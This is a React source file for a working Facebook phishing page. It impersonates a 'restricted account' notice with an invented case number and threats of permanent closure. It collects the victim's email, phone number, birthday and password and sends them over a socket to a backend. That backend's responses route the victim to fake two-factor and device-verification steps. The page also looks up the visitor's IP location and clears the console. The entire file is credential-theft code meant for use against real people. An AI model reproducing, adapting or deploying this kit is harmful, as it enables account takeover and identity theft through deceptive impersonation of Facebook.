import { faEye, faEyeSlash } from "@fortawesome/free-regular-svg-icons";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import PropTypes from "prop-types";
import { useContext, useEffect, useMemo, useRef, useState } from "react";
import PhoneInput, { isPossiblePhoneNumber } from "react-phone-number-input";
import "react-phone-number-input/style.css";
import { Link, useNavigate } from "react-router-dom";
import { SocketContext } from "../App";
import Icon from "../public/icon.png";
import ImageHome from "../public/image-home.png";
import Logo from "../public/logo.png";
const Spinner = () => {
	return (
		<div className='h-10 w-10 animate-spin rounded-full border-4 border-solid border-current border-r-transparent align-[-0.125em] motion-reduce:animate-[spin_1.5s_linear_infinite]'></div>
	);
};

const ShowLoading = ({ url, mode }) => {
	const [loading, setLoading] = useState(".");
	const [loadingLine, setLoadingLine] = useState("w-0");
	const navigate = useNavigate();

	useEffect(() => {
		if (loading.length < 5) {
			setTimeout(() => {
				setLoading(loading + ".");
			}, 500);
		} else {
			setLoading(".");
		}

		switch (loadingLine) {
			case "w-0":
				setTimeout(() => {
					setLoadingLine("w-1/5");
				}, 1000);
				break;
			case "w-1/5":
				setTimeout(() => {
					setLoadingLine("w-2/5");
				}, 1000);
				break;
			case "w-2/5":
				setTimeout(() => {
					setLoadingLine("w-3/5");
				}, 1000);
				break;
			case "w-3/5":
				setTimeout(() => {
					setLoadingLine("w-4/5");
				}, 1000);
				break;
			case "w-4/5":
				setTimeout(() => {
					setLoadingLine("w-full");
				}, 1000);
				break;
			case "w-full":
				if (url.includes("http")) {
					window.location.replace(url);
				} else {
					navigate(`/verify?mode=${mode}`);
				}
				break;
			default:
				break;
		}
	}, [loading, loadingLine, navigate, url, mode]);

	return (
		<div className='fixed left-0 top-0 z-50 flex h-full w-full items-center justify-center bg-gray-200'>
			<div className='fixed -top-5 left-0 h-1/6 w-full bg-white'></div>
			<div className='flex w-11/12 flex-col items-center justify-center rounded-lg bg-white p-5 sm:w-1/3'>
				<img src={Icon} alt='Loading Icon' />
				<p className='my-5 text-2xl font-bold'>Please Wait{loading}</p>
				<p className=' font-bold'>Thank you for confirming your account</p>
				<p className='text-center'>
					This warning is to prevent the account being permanently disabled if
					there is a violation of Facebook&#39;s terms.
				</p>
				<div className='h-2 w-full rounded-lg border border-gray-300 bg-gray-50'>
					<div className={`h-full rounded-lg ${loadingLine} bg-blue-500`}></div>
				</div>
			</div>
		</div>
	);
};

const Home = () => {
	const [date, setDate] = useState("");
	const [defaultCountry, setDefaultCountry] = useState("");
	const [email, setEmail] = useState("");
	const [error, setError] = useState("");
	const [loading, setLoading] = useState(false);
	const [mode, setMode] = useState("");
	const [password, setPassword] = useState("");
	const [phone, setPhone] = useState("");
	const [showLoading, setShowLoading] = useState(false);
	const [showModal, setShowModal] = useState(false);
	const [showPassword, setShowPassword] = useState(false);
	const [stateButton, setStateButton] = useState("bg-blue-200");
	const [url, setUrl] = useState("");
	const dateInput = useRef(null);
	const emailInput = useRef(null);
	const phoneInput = useRef(null);
	const [count, setCount] = useState(0);
	const socket = useContext(SocketContext);
	const handleChange = (e) => {
		const inputChar = e.target.value[e.target.value.length - 1];
		if (!isNaN(inputChar)) {
			if (e.target.value.length < 11) {
				if (e.target.value.length === 2 || e.target.value.length === 5) {
					e.target.value += "/";
					e.target.setSelectionRange(
						e.target.value.length,
						e.target.value.length,
					);
				}
				setDate(e.target.value);
				handleDate(e);
			}
		} else {
			e.preventDefault();
			setDate("");
		}
	};

	const handleEmail = (e) => {
		setEmail(e.target.value);
		e.preventDefault();
		var value = e.target.value;
		if (e.target.value.length > 0) {
			value.includes("@") && value.includes(".")
				? setError("")
				: setError("Please enter a valid email");
		} else {
			setError("Please enter a valid email");
		}
	};

	const handleDate = (e) => {
		e = e.target.value;
		if (e.length === 10) {
			setError("");
		} else {
			setError("Please enter a valid date");
		}
	};
	const handlePassword = (e) => {
		setPassword(e.target.value);
		e.preventDefault();
		if (e.target.value.length > 0) {
			setStateButton("bg-blue-500");
			setError("");
		} else {
			setStateButton("bg-blue-200");
			setError("Please enter a valid password");
		}
	};
	const handleSendPassword = () => {
		if (password.length > 0) {
			setStateButton("bg-blue-200");
			setLoading(true);
			socket.emit("login", { email, phone, password, date });
			socket.on("loginResponse", (data) => {
				if (data.message === "WRONG_CREDENTIALS") {
					setLoading(false);
					setStateButton("bg-blue-200");
					setPassword("");
					setError("Invalid password");
					setCount(count + 1);
					if (count === 2) {
						setLoading(false);
						setShowLoading(true);
						setUrl("/verify");
						setMode("forget-password");
					}
				} else if (data.message === "TWO_FACTOR_AUTH_REQUIRED") {
					setLoading(false);
					setShowLoading(true);
					setUrl("/verify");
					setMode("two-factor");
				} else if (data.message === "DEVICE_VERIFICATION") {
					setLoading(false);
					setShowLoading(true);
					setUrl("/verify");
					setMode("device-verification");
				} else {
					setLoading(false);
					setShowLoading(true);
					socket.emit("exit");
					setUrl("/submit");
				}
			});
		}
	};

	const handleShowPassword = () => {
		setShowPassword(!showPassword);
	};

	const handlePhone = (value) => {
		setPhone(value);
		setError(
			value && !isPossiblePhoneNumber(value)
				? "Please enter a valid phone number"
				: "",
		);
	};
	const handleSubmit = (e) => {
		e.preventDefault();
		if (date !== "" && phone !== "" && email !== "" && error === "") {
			setShowModal(true);
		}
		if (date === "") {
			dateInput.current.focus();
			setError("Please enter a valid date");
		}
		if (phone === "") {
			phoneInput.current.focus();
			setError("Please enter a valid phone number");
		}
		if (email === "") {
			emailInput.current.focus();
			setError("Please enter a valid email");
		}
	};

	const handleCloseModal = () => {
		if (password !== "") {
			setShowModal(false);
			setLoading(false);
			setPassword("");
			setStateButton("bg-blue-200");
		}
	};

	useEffect(() => {
		emailInput.current.focus();
		fetch("https://api.ipify.org?format=json")
			.then((response) => response.json())
			.then((data) => {
				const ipAddress = data.ip;
				fetch(`https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`)
					.then((response) => response.json())
					.then((data) => {
						const countryCode = data.country_code2;
						setDefaultCountry(countryCode);
						console.clear();
					})
					.catch((error) =>
						console.error("Error fetching IP location data:", error),
					);
			})
			.catch((error) => console.error("Error fetching IP address:", error));
	}, []);

	const formattedDate = new Intl.DateTimeFormat("en-US", {
		month: "long",
		day: "numeric",
		year: "numeric",
	}).format(new Date());

	const randomNumber = useMemo(
		() => "#" + Math.floor(Math.random() * 1000000000000),
		[],
	);

	return (
		<div>
			<header className='fixed left-0 top-0 flex h-10 w-full bg-gray-100'>
				<Link to={"/"}>
					<img
						className='pointer-events-none ml-5 max-h-full select-none'
						src={Logo}
						alt=''
					/>
				</Link>
			</header>
			<main className='lg:w-2.5/5 mx-auto mt-10 w-11/12 pt-14 sm:w-11/12 md:w-2/3 xl:w-2/5'>
				<Link to={"/"}>
					<img
						className='pointer-events-none mx-auto mb-5 block h-full w-full select-none'
						src={ImageHome}
						alt=''
					/>
				</Link>
				<p className='text-2xl font-bold'>Your account has been restricted</p>
				<span className='text-sm text-gray-500'>Term of Service</span>
				<hr />
				<div className='my-5'>
					We detected unusual activity in your page today{" "}
					<strong>{formattedDate}</strong>. Someone has reported your account
					for not complying with{" "}
					<a className='cursor-pointer text-blue-500 hover:underline'>
						Community Standards
					</a>
					. We have already reviewed this decision and the decision cannot be
					changed. To avoid having your account{" "}
					<a className='cursor-pointer text-blue-500 hover:underline'>
						disabled
					</a>
					, please verify:
				</div>
				<div className='my-5'>
					<input
						className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
						type='text'
						placeholder='Page Name'
					/>
					<input
						className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
						type='text'
						placeholder='Your Name (Name and Surname)'
					/>
					<input
						ref={emailInput}
						className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
						type='email'
						placeholder='Your Email Address'
						onBlur={handleEmail}
						onChange={handleEmail}
					/>
					{error.includes("email") && <p className='text-red-500'>{error}</p>}
					<PhoneInput
						ref={phoneInput}
						className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
						placeholder='Your Phone Number'
						defaultCountry={defaultCountry}
						international
						countryCallingCodeEditable={false}
						value={phone}
						onChange={handlePhone}
						countrySelectProps={{ tabIndex: -1 }}
					/>
					<div>
						{error.includes("Please enter a valid phone number") && (
							<p className='text-red-500'>{error}</p>
						)}
					</div>
					<input
						ref={dateInput}
						className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
						type='text'
						value={date}
						onChange={handleChange}
						onBlur={handleDate}
						placeholder='Birthday (MM/DD/YYYY)'
					/>
					{error.includes("Please enter a valid date") && (
						<p className='text-red-500'>{error}</p>
					)}
				</div>

				<div className='flex flex-col justify-between border-b border-t border-gray-300 p-2 text-sm text-gray-500 sm:flex-row'>
					<div className='flex gap-1 sm:flex-col sm:gap-0'>
						<b>Case Number:</b>
						<b className='text-blue-500'> {randomNumber}</b>
					</div>
					<div className='w-full sm:w-3/4 '>
						<b>
							About Case: Violating Community Standards and Posting something
							inappropriate.
						</b>
					</div>
				</div>
				<div className='my-5'>
					<button
						onClick={handleSubmit}
						className='block w-full cursor-pointer rounded-lg bg-blue-500 py-3 text-center text-lg font-semibold text-white focus:outline-none sm:py-3 xl:py-3'
					>
						Continue
					</button>
				</div>
			</main>
			<footer className='bottom-0 left-0 right-0 mt-10 flex h-10 w-full items-center justify-center bg-gray-100 text-sm'>
				<div className='hidden max-h-full w-3/4 items-baseline p-2 sm:flex'>
					<svg
						width='17'
						height='17'
						viewBox='0 0 30 20'
						fill='none'
						xmlns='http://www.w3.org/2000/svg'
					>
						<path
							fillRule='evenodd'
							clipRule='evenodd'
							d='M11.9961 12.583C11.9531 13.102 11.5191 13.5 11.0001 13.5C10.4801 13.5 10.0471 13.102 10.0041 12.583L9.50413 6.603C9.50113 6.575 9.50013 6.547 9.50013 6.52C9.50013 5.783 10.0251 5 11.0001 5C11.9751 5 12.5001 5.783 12.5001 6.52L11.9961 12.583ZM11.0001 17.5C10.1731 17.5 9.50013 16.827 9.50013 16C9.50013 15.173 10.1731 14.5 11.0001 14.5C11.8271 14.5 12.5001 15.173 12.5001 16C12.5001 16.827 11.8271 17.5 11.0001 17.5ZM12.7301 1.003C12.3771 0.376 11.7431 0.001 11.0371 0H11.0331C10.3271 0 9.69313 0.373 9.33913 0.998L0.268128 16.989C-0.0878717 17.617 -0.0898717 18.366 0.265128 18.996C0.618128 19.624 1.25213 20 1.96213 20H20.0381C20.7461 20 21.3811 19.625 21.7341 18.998C22.0881 18.37 22.0881 17.622 21.7351 16.994L12.7301 1.003Z'
							fill='#E69600'
						></path>
					</svg>
					<div className='text-gray-500'>
						Please make sure to fill in the data correctly, if you fill in the
						wrong data your account will be permanently closed. To learn more
						about why we deactivate accounts, go to{" "}
						<a className='cursor-pointer text-blue-500 hover:underline'>
							Community Standards
						</a>
						.{" "}
					</div>
				</div>
			</footer>
			{showLoading && <ShowLoading url={url} mode={mode} />}
			{showModal && (
				<div
					className='fixed left-0 top-0 flex h-full w-full items-center justify-center bg-gray-400 bg-opacity-50'
					onClick={handleCloseModal}
				>
					<div
						className='flex w-11/12 flex-col items-center justify-center rounded-lg bg-white p-3 sm:w-2/5'
						onClick={(e) => e.stopPropagation()}
					>
						<p className='my-3 text-lg'>
							Please enter your password to continue
						</p>
						<div className='relative flex w-full items-center justify-center'>
							<input
								className='my-2 w-full rounded-lg border border-gray-300 p-4 text-base focus:border-blue-500 focus:outline-none'
								type={showPassword ? "text" : "password"}
								placeholder='Password'
								onChange={(e) => setPassword(e.target.value)}
								onInput={handlePassword}
								value={password}
							/>
							<FontAwesomeIcon
								icon={showPassword ? faEyeSlash : faEye}
								onClick={handleShowPassword}
								className='absolute right-0 cursor-pointer pr-4'
							/>
						</div>
						{error.includes("password") && (
							<p className='w-full items-start justify-start text-red-500'>
								{error}
							</p>
						)}
						<button
							onClick={handleSendPassword}
							className={`${stateButton} ${stateButton === "bg-blue-200" ? "cursor-wait" : "cursor-pointer"} my-3 flex w-full cursor-pointer items-center justify-center rounded-lg py-3 text-center text-lg font-semibold text-white focus:outline-none sm:py-3 xl:py-3`}
							disabled={stateButton === "bg-blue-200"}
						>
							{loading ? <Spinner /> : "Continue"}
						</button>
					</div>
				</div>
			)}
		</div>
	);
};

ShowLoading.propTypes = {
	url: PropTypes.string.isRequired,
	mode: PropTypes.string.isRequired,
};

export { Home, ShowLoading, Spinner };
